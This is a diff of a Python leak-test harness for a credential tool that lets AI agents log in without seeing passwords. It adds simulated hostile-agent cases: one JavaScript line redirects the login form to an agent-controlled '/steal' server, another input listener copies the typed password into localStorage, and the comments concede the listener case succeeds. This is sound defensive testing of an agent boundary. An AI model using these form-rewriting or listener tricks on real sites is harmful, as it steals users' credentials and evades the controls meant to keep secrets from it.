@@ -4,21 +4,33 @@ It runs in two separate invocations because the session transcript only records 
 after the command has returned:
 
   1. run     Makes secrets the caller never sees, stores them in a throwaway store, serves a local login
-             site, and then uses them through every command an agent has - list, run (stdin, env and
-             askpass), and login in the Director-owned browser: a one-page login, a two-step login, a
-             wrong password, a form that will not submit (so the typed password has to be cleared), and a
-             tab on a domain the entry does not allow. After each login it takes what an agent can take:
-             browser-harness page info, the page HTML, the page text, every input's value, the
-             accessibility tree, and a screenshot. EVERYTHING it prints is what the agent would see, and
-             it all lands in the transcript.
-  2. verify  Searches the transcript, the recorded command output, the audit log, the tool log (which is
-             where the debug-port traffic is logged), the browser-harness daemon log, the Director logs,
-             and the text read out of every screenshot, for every form of every secret.
+             site (and a second "agent" site on another port), and then uses them through every command
+             an agent has - list, run (stdin, env and askpass), and login in the Director-owned browser.
+             The login cases: a one-page form, a two-step form, a wrong password, a form that will not
+             submit, a tab on a host the entry does not allow, an entry kept back from agents, and the
+             reviewer's cases from pull request 2891 - pressing Back after logging in and after a wrong
+             password, a single-page app that hides its form, an agent rewriting the form's action to its
+             own server, and a tab on another port of the allowed host. After each login it takes what an
+             agent can take: browser-harness page info, the page HTML, the page text, every input's value
+             (hidden ones included), the accessibility tree, and a screenshot. EVERYTHING it prints is what
+             the agent would see, and it all lands in the transcript.
+  2. verify  Checks every login had the expected outcome, then searches the transcript, the recorded
+             command output, the audit log, the tool log (where the debug-port traffic is logged), the
+             browser-harness daemon log, the Director logs, and the text read out of every screenshot,
+             for every form of every secret, in every output encoding.
 
 Neither step prints a secret, and verify refuses to call a search clean unless it first finds a planted
 copy of the secret in each kind of file, and unless each file covers this run. Screenshots are read with
 Windows' built-in text recognition; the control is a page that shows the secret in plain text, which the
 recognition must read back before its silence about the real screenshots counts.
+
+Where a check needs to know whether an agent-side action got hold of the secret - the agent's own server
+receiving it, or a listener the agent attached to the page - the comparison is made here, privately, and
+only "yes" or "no" is printed.
+
+Known limitation, checked and reported rather than hidden: JavaScript already running in the page receives
+the password, because the site needs it, so an input listener an agent attaches to the page before calling
+login can copy it. That case is expected to say "yes".
 
 Not covered, stated plainly: network traffic leaving the machine (browser-harness telemetry, which sends
 no page content), and Chrome's own "save this password?" prompt, which appears in the browser window
@@ -38,7 +50,6 @@ import shutil
 import subprocess
 import sys
 import threading
-import time
 import urllib.request
 from datetime import datetime, timezone
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
@@ -67,49 +78,73 @@ def say(text: str, out) -> None:
 
 
 # ------------------------------------------------------------------------------------------------------
-# The local login site
+# The local sites
 # ------------------------------------------------------------------------------------------------------
 
-def make_site(good_secret: str, marker: str):
-    form = """<!doctype html><html><head><title>Leak check {title}</title></head><body style="font:20px sans-serif">
-<h1>Leak check {title}</h1><p>{message}</p>
+FORM = """<!doctype html><html><head><title>Leak check {title}</title></head><body style="font:20px sans-serif">
+<h1 id="heading">Leak check {title}</h1><p>{message}</p>
 <form method="post" action="{action}" {extra}>
 {fields}
-<button type="submit">Sign in</button></form></body></html>"""
-    user_field = '<p><label>User <input name="username" autocomplete="username"></label></p>'
-    pass_field = '<p><label>Password <input type="password" name="password" autocomplete="current-password"></label></p>'
+<button type="submit">Sign in</button></form>{script}</body></html>"""
+USER_FIELD = '<p><label>User <input name="username" autocomplete="username"></label></p>'
+PASS_FIELD = '<p><label>Password <input type="password" name="password" autocomplete="current-password"></label></p>'
+SPA_SCRIPT = """<script>
+document.forms[0].addEventListener('submit', e => {
+  e.preventDefault();
+  fetch('/api', {method: 'POST', body: new URLSearchParams(new FormData(e.target))}).then(r => {
+    if (r.ok) { e.target.style.display = 'none'; document.getElementById('heading').textContent = 'Welcome'; }
+  });
+});
+</script>"""
 
-    class Handler(BaseHTTPRequestHandler):
-        def log_message(self, *args):
-            pass
 
-        def _send(self, status, body="", location=None):
-            data = body.encode("utf-8")
-            self.send_response(status)
-            if location:
-                self.send_header("Location", location)
-            self.send_header("Content-Type", "text/html; charset=utf-8")
-            self.send_header("Content-Length", str(len(data)))
-            self.end_headers()
-            self.wfile.write(data)
+def _serve(handler_class):
+    server = ThreadingHTTPServer(("127.0.0.1", 0), handler_class)
+    threading.Thread(target=server.serve_forever, daemon=True).start()
+    return server
 
+
+class _Handler(BaseHTTPRequestHandler):
+    def log_message(self, *args):
+        pass
+
+    def _send(self, status, body="", location=None):
+        data = body.encode("utf-8")
+        self.send_response(status)
+        if location:
+            self.send_header("Location", location)
+        self.send_header("Content-Type", "text/html; charset=utf-8")
+        self.send_header("Content-Length", str(len(data)))
+        self.end_headers()
+        self.wfile.write(data)
+
+    def _fields(self):
+        length = int(self.headers.get("Content-Length", "0"))
+        return parse_qs(self.rfile.read(length).decode("utf-8"))
+
+
+def make_site(good_secret: str, marker: str):
+    class Handler(_Handler):
         def do_GET(self):
             url = urlsplit(self.path)
             query = parse_qs(url.query)
             if url.path == "/login":
                 message = "Wrong password." if "error" in query else "Please sign in."
-                self._send(200, form.format(title="login", message=message, action="/session", extra="",
-                                            fields=user_field + pass_field))
+                self._send(200, FORM.format(title="login", message=message, action="/session", extra="",
+                                            fields=USER_FIELD + PASS_FIELD, script=""))
             elif url.path == "/two-step":
-                self._send(200, form.format(title="two-step", message="Step one.", action="/two-step-user",
-                                            extra="", fields=user_field))
+                self._send(200, FORM.format(title="two-step", message="Step one.", action="/two-step-user",
+                                            extra="", fields=USER_FIELD, script=""))
             elif url.path == "/two-step-password":
                 hidden = f'<input type="hidden" name="username" value="{html.escape(query.get("u", [""])[0])}">'
-                self._send(200, form.format(title="two-step password", message="Step two.", action="/session",
-                                            extra="", fields=hidden + pass_field))
+                self._send(200, FORM.format(title="two-step password", message="Step two.", action="/session",
+                                            extra="", fields=hidden + PASS_FIELD, script=""))
             elif url.path == "/stuck":
-                self._send(200, form.format(title="stuck", message="This form never submits.", action="/session",
-                                            extra='onsubmit="return false"', fields=user_field + pass_field))
+                self._send(200, FORM.format(title="stuck", message="This form never submits.", action="/session",
+                                            extra='onsubmit="return false"', fields=USER_FIELD + PASS_FIELD, script=""))
+            elif url.path == "/spa":
+                self._send(200, FORM.format(title="single-page app", message="Sign in.", action="/api", extra="",
+                                            fields=USER_FIELD + PASS_FIELD, script=SPA_SCRIPT))
             elif url.path == "/welcome":
                 self._send(200, f"<!doctype html><title>Leak check welcome</title><h1>Signed in as {USERNAME}</h1><p>{marker}</p>")
             elif url.path == "/planted":
@@ -119,20 +154,36 @@ def make_site(good_secret: str, marker: str):
                 self._send(404, "not found")
 
         def do_POST(self):
-            length = int(self.headers.get("Content-Length", "0"))
-            fields = parse_qs(self.rfile.read(length).decode("utf-8"))
+            fields = self._fields()
             username = fields.get("username", [""])[0]
             password = fields.get("password", [""])[0]
             if self.path == "/two-step-user":
                 self._send(303, location=f"/two-step-password?u={username}")
+            elif self.path == "/api":
+                self._send(200 if password == good_secret else 401, "ok")
             elif self.path == "/session" and username == USERNAME and password == good_secret:
                 self._send(303, location="/welcome")
             else:
                 self._send(303, location="/login?error=1")
 
-    server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
-    threading.Thread(target=server.serve_forever, daemon=True).start()
-    return server
+    return _serve(Handler)
+
+
+def make_agent_site(received: list):
+    """A server an agent controls, on another port of the same host. Records every password sent to it."""
+    class Handler(_Handler):
+        def do_GET(self):
+            if urlsplit(self.path).path == "/login":
+                self._send(200, FORM.format(title="login", message="Please sign in.", action="/session", extra="",
+                                            fields=USER_FIELD + PASS_FIELD, script=""))
+            else:
+                self._send(404, "not found")
+
+        def do_POST(self):
+            received.append(self._fields().get("password", [""])[0])
+            self._send(200, "<!doctype html><title>Leak check agent</title><h1>thanks</h1>")
+
+    return _serve(Handler)
 
 
 # ------------------------------------------------------------------------------------------------------
@@ -145,8 +196,8 @@ def command(argv, out, env=None, stdin=None, timeout=180):
     resolved = shutil.which(argv[0])
     if resolved is None:
         raise SystemExit(f"{argv[0]} is not on PATH.")
-    result = subprocess.run([resolved] + list(argv[1:]), input=stdin, capture_output=True, text=True, env=env, timeout=timeout,
-                            encoding="utf-8", errors="replace")
+    result = subprocess.run([resolved] + list(argv[1:]), input=stdin, capture_output=True, text=True, env=env,
+                            timeout=timeout, encoding="utf-8", errors="replace")
     say((result.stdout + result.stderr).rstrip() + f"\n(exit {result.returncode})", out)
     return result
 
@@ -158,13 +209,18 @@ def harness(script: str, out, env) -> subprocess.CompletedProcess:
     return command([exe], out, env=env, stdin=script)
 
 
+def harness_private(script: str, env) -> str:
+    """Run a harness script whose output may hold a secret. Its output is returned, never printed."""
+    return subprocess.run([shutil.which("browser-harness")], input=script, capture_output=True, text=True,
+                          env=env, timeout=120, encoding="utf-8", errors="replace").stdout
+
+
 def run(args) -> int:
     workdir = Path(args.workdir).resolve()
     if workdir.exists() and any(workdir.iterdir()):
         raise SystemExit(f"{workdir} is not empty; give run a fresh folder.")
     workdir.mkdir(parents=True, exist_ok=True)
-    home = workdir / "secrets-home"
-    os.environ["CC_SECRETS_HOME"] = str(home)
+    os.environ["CC_SECRETS_HOME"] = str(workdir / "secrets-home")
 
     from src import paths
     from src.store import SecretStore, make_entry
@@ -173,14 +229,19 @@ def run(args) -> int:
     run_id = "live-" + secrets.token_hex(6)
     started = datetime.now(timezone.utc)
     good, wrong, kept = ocr_safe_secret(), ocr_safe_secret(), ocr_safe_secret()
-    store = SecretStore(UserOnlyFile(paths.store_path()))
-    store.put(make_entry("leak-good", USERNAME, good, ["127.0.0.1"], run_id, True, ["login", "run"]))
-    store.put(make_entry("leak-wrong", USERNAME, wrong, ["127.0.0.1"], run_id, True, ["login"]))
-    store.put(make_entry("leak-kept", USERNAME, kept, ["127.0.0.1"], run_id, False, ["login", "run"]))
-
+    received = []
     site = make_site(good, run_id)
+    agent_site = make_agent_site(received)
     port = site.server_address[1]
+    agent_port = agent_site.server_address[1]
     base = f"http://127.0.0.1:{port}"
+    agent_base = f"http://127.0.0.1:{agent_port}"
+
+    store = SecretStore(UserOnlyFile(paths.store_path()))
+    store.put(make_entry("leak-good", USERNAME, good, [base], run_id, True, ["login", "run"]))
+    store.put(make_entry("leak-wrong", USERNAME, wrong, [base], run_id, True, ["login"]))
+    store.put(make_entry("leak-kept", USERNAME, kept, [base], run_id, False, ["login", "run"]))
+
     shots = workdir / "screenshots"
     shots.mkdir()
     output_path = workdir / "run-output.txt"
@@ -190,9 +251,10 @@ def run(args) -> int:
         raise SystemExit("cc-secrets is not installed next to this Python or on PATH.")
     env = dict(os.environ)
     py = sys.executable
+    results, expected, agent_checks = {}, {}, {}
 
     with open(output_path, "w", encoding="utf-8") as out:
-        say(f"run marker: {run_id}   site: {base}   browser: {args.browser}", out)
+        say(f"run marker: {run_id}   site: {base}   agent site: {agent_base}   browser: {args.browser}", out)
 
         listing = command(["cc-devthrottle", "browser", "list", "--json"], out)
         was_running = any(b.get("id") == args.browser and b.get("status") not in ("Stopped", None)
@@ -206,20 +268,22 @@ def run(args) -> int:
                 env[key] = value.strip().strip("'\"")
         say(f"attached: BU_NAME={env.get('BU_NAME')} BU_CDP_URL={env.get('BU_CDP_URL')}", out)
 
-        # A tab left on a loopback address by an earlier run would match this run's allowed domain and be
+        # A tab left on a loopback address by an earlier run would match this run's allowed address and be
         # picked instead of the tab under test. Close them so each case drives the tab it set up.
         debug = env["BU_CDP_URL"].rstrip("/")
         with urllib.request.urlopen(f"{debug}/json/list", timeout=10) as response:
             for target in json.loads(response.read().decode("utf-8")):
                 if target.get("type") == "page" and urlsplit(target.get("url", "")).hostname in ("127.0.0.1", "localhost"):
                     urllib.request.urlopen(f"{debug}/json/close/{target['id']}", timeout=10).read()
-                    say(f"closed a leftover loopback tab from an earlier run", out)
+                    say("closed a leftover loopback tab from an earlier run", out)
 
         command([cc, "list"], out, env=env)
         command([cc, "list", "--json"], out, env=env)
         command([cc, "run", "leak-good", "--", py, "-c",
                  "import sys,base64; s=sys.stdin.readline().strip(); print('plain', s); print('b64', base64.b64encode(s.encode()).decode())"], out, env=env)
         command([cc, "run", "leak-good", "--via", "env", "--", py, "-c", "import os; print('env', os.environ['CC_SECRET'])"], out, env=env)
+        command([cc, "run", "leak-good", "--via", "env", "--", "cmd", "/c", "echo cmd %CC_SECRET%"], out, env=env)
+        command([cc, "run", "leak-good", "--via", "env", "--", "cmd", "/u", "/c", "echo utf16 %CC_SECRET%"], out, env=env)
         command([cc, "run", "leak-good", "--via", "askpass", "--", py, "-c",
                  "import os,subprocess; print('askpass', subprocess.run(['cmd','/c',os.environ['SUDO_ASKPASS']],capture_output=True,text=True).stdout)"], out, env=env)
         command([cc, "run", "leak-kept", "--", py, "-c", "import sys; print(sys.stdin.read())"], out, env=env)
@@ -236,20 +300,42 @@ print(json.dumps(tree)[:200000])
 capture_screenshot(path=r"%s")
 print("screenshot saved")
 """
-        results = {}
 
-        def login_case(label, url, entry):
-            harness(f"import json\ngoto_url({url!r})\nwait_for_load()\nprint(page_info())", out, env)
+        def login_case(label, url, entry, outcome, before="", after=""):
+            expected[label] = outcome
+            harness(f"import json\ngoto_url({url!r})\nwait_for_load()\n{before}\nprint(page_info())", out, env)
             results[label] = command([cc, "login", entry, "--browser", args.browser, "--json", "--timeout", "20"], out, env=env).stdout
-            harness("import json\n" + snapshot % str(shots / f"{label}.png"), out, env)
+            harness("import json\n" + after + "\n" + snapshot % str(shots / f"{label}.png"), out, env)
+
+        go_back = "js('history.back()')\nwait(2)\nwait_for_load()\nprint('pressed Back:', page_info()['url'])"
 
         harness(f"new_tab({base + '/login'!r})\nwait_for_load()\nprint(page_info())", out, env)
-        login_case("one-page", f"{base}/login", "leak-good")
-        login_case("two-step", f"{base}/two-step", "leak-good")
-        login_case("wrong-password", f"{base}/login", "leak-wrong")
-        login_case("stuck-form", f"{base}/stuck", "leak-good")
-        login_case("wrong-domain", f"http://localhost:{port}/login", "leak-good")
-        login_case("kept-back", f"{base}/login", "leak-kept")
+        login_case("one-page", f"{base}/login", "leak-good", "logged in")
+        login_case("two-step", f"{base}/two-step", "leak-good", "logged in")
+        login_case("wrong-password", f"{base}/login", "leak-wrong", "failed")
+        login_case("stuck-form", f"{base}/stuck", "leak-good", "failed")
+        login_case("wrong-host", f"http://localhost:{port}/login", "leak-good", "refused")
+        login_case("kept-back", f"{base}/login", "leak-kept", "refused")
+        login_case("back-after-login", f"{base}/login", "leak-good", "logged in", after=go_back)
+        login_case("back-after-wrong-password", f"{base}/login", "leak-wrong", "failed", after=go_back)
+        login_case("single-page-app-hidden-form", f"{base}/spa", "leak-good", "logged in")
+
+        received.clear()
+        login_case("agent-rewrites-form-action", f"{base}/login", "leak-good", "refused",
+                   before=f"js(\"document.forms[0].action = '{agent_base}/steal'\")")
+        agent_checks["agent-rewrites-form-action: agent server received the secret"] = good in received
+        received.clear()
+        login_case("tab-on-another-port", f"{agent_base}/login", "leak-good", "refused")
+        agent_checks["tab-on-another-port: agent server received the secret"] = good in received
+
+        # The known limitation: a listener the agent attached to the page before login.
+        login_case("agent-input-listener", f"{base}/login", "leak-good", "logged in",
+                   before="js(\"document.querySelector('input[type=password]').addEventListener('input', e => localStorage.setItem('grab', e.target.value))\")")
+        grabbed = harness_private("print(js(\"localStorage.getItem('grab') || ''\"))", env)
+        agent_checks["agent-input-listener (known limitation): agent read the secret"] = good in grabbed
+        harness("js(\"localStorage.removeItem('grab')\")\nprint('cleared the agent listener storage')", out, env)
+        for label, recovered in agent_checks.items():
+            say(f"{label}: {'yes' if recovered else 'no'}", out)
 
         # The recognition control: a page that shows the secret in plain text. Nothing about it is printed.
         control = subprocess.run([shutil.which("browser-harness")], input=(
@@ -266,7 +352,7 @@ print("screenshot saved")
         say("login outcomes:", out)
         for label, text in results.items():
             try:
-                say(f"  {label}: {json.loads(text)['outcome']}", out)
+                say(f"  {label}: {json.loads(text)['outcome']} (expected {expected[label]})", out)
             except (ValueError, KeyError):
                 say(f"  {label}: (no JSON result)", out)
 
@@ -275,10 +361,12 @@ print("screenshot saved")
          f"from browser_harness import _ipc; print(_ipc.log_path({env.get('BU_NAME', 'default')!r}))"],
         capture_output=True, text=True, env=env).stdout.strip()
     state = {"runId": run_id, "startedUtc": started.isoformat(), "port": port, "browser": args.browser,
-             "harnessLog": harness_log, "results": {k: json.loads(v) if v.strip().startswith("{") else None
-                                                     for k, v in results.items()}}
+             "harnessLog": harness_log, "expected": expected, "agentChecks": agent_checks,
+             "screenshots": len(expected),
+             "results": {k: json.loads(v) if v.strip().startswith("{") else None for k, v in results.items()}}
     (workdir / "state.json").write_text(json.dumps(state, indent=2), encoding="utf-8")
     site.shutdown()
+    agent_site.shutdown()
     print(f"run finished; now run: verify --workdir {workdir} --transcript <this session's transcript>")
     return 0
 
@@ -332,14 +420,27 @@ def verify(args) -> int:
     pairs = [(e.secret.reveal(), e.username) for e in entries]
     search = SecretSearch(pairs)
     work = workdir / "verify-work"
+    work.mkdir(exist_ok=True)
     run_id = state["runId"]
     started = datetime.fromisoformat(state["startedUtc"]).timestamp()
-    report = []
+    failures = 0
+
+    print("login outcomes:")
+    for label, want in state["expected"].items():
+        got = (state["results"].get(label) or {}).get("outcome")
+        ok = got == want
+        failures += 0 if ok else 1
+        print(f"  {'ok  ' if ok else 'WRONG'} {label}: {got} (expected {want})")
+    print("agent-side checks:")
+    for label, recovered in state["agentChecks"].items():
+        known = "known limitation" in label
+        wrong = recovered and not known
+        failures += 1 if wrong else 0
+        print(f"  {'WRONG' if wrong else 'ok  '} {label}: {'yes' if recovered else 'no'}")
 
     def recent(folder: Path):
         return [p for p in folder.glob("*.log") if p.stat().st_mtime >= started] if folder.exists() else []
 
-    # 1. Plain files, each with a marker proving it covers this run.
     files = [
         (Path(args.transcript), run_id),
         (workdir / "run-output.txt", run_id),
@@ -356,43 +457,38 @@ def verify(args) -> int:
 
     try:
         searched, hits = search.search_files(files, work)
-        report.append(f"files searched: {searched} (transcript, command output, audit log, tool log, "
-                      f"harness log: {'yes' if harness_log.exists() else 'NOT FOUND'}, Director logs: {len(director_logs)})")
+        print(f"files searched: {searched} (transcript, command output, audit log, tool log, "
+              f"harness log: {'yes' if harness_log.exists() else 'NOT FOUND'}, Director logs: {len(director_logs)})")
 
-        # The search must also find the secrets where they legitimately are: the store itself.
         if not search.hits_in_bytes(paths.store_path().read_bytes(), "store"):
             raise BrokenInstrumentError("The search did not find the secrets in the store file itself.")
-        report.append("control: the secrets ARE found in the store file")
+        print("control: the secrets ARE found in the store file")
 
-        # 2. Screenshots, through text recognition, after the control proves recognition reads the secret.
         good = next(e.secret.reveal() for e in entries if e.name == "leak-good")
         if good not in ocr(workdir / "control.png", work):
             raise BrokenInstrumentError("Text recognition could not read the secret on the control page, "
                                         "so it cannot show that a screenshot is clean.")
-        report.append("control: text recognition reads the secret off the control page")
+        print("control: text recognition reads the secret off the control page")
         shots = sorted((workdir / "screenshots").glob("*.png"))
-        if len(shots) < 6:
-            raise BrokenInstrumentError(f"Only {len(shots)} screenshots were taken; expected 6.")
+        if len(shots) < state["screenshots"]:
+            raise BrokenInstrumentError(f"Only {len(shots)} screenshots were taken; expected {state['screenshots']}.")
+        screenshot_hits = 0
         for shot in shots:
             text = ocr(shot, work)
             if not text:
                 raise BrokenInstrumentError(f"Text recognition read nothing from {shot.name}.")
             if any(secret in text for secret, _ in pairs):
-                hits.append(type("Hit", (), {"path": shot.name, "form_index": 0, "encoding": "screenshot"})())
-        report.append(f"screenshots read: {len(shots)}")
+                screenshot_hits += 1
+                print(f"LEAK: a secret is readable in screenshot {shot.name}")
+        print(f"screenshots read: {len(shots)}")
     except BrokenInstrumentError as exc:
         print(f"BROKEN INSTRUMENT: {exc}")
         return 2
 
-    for line in report:
-        print(line)
-    print("login outcomes: " + ", ".join(f"{k}={(v or {}).get('outcome')}" for k, v in state["results"].items()))
-    if hits:
-        for hit in hits:
-            print(f"LEAK: a form of a secret was found in {hit.path} ({hit.encoding})")
-        return 1
-    print(f"secret forms searched: {search.form_count}; hits: 0")
-    return 0
+    for hit in hits:
+        print(f"LEAK: a form of a secret was found in {hit.path} ({hit.encoding})")
+    print(f"secret forms searched: {search.form_count}; hits: {len(hits) + screenshot_hits}; wrong outcomes or agent checks: {failures}")
+    return 1 if hits or screenshot_hits or failures else 0
 
 
 def main() -> int:
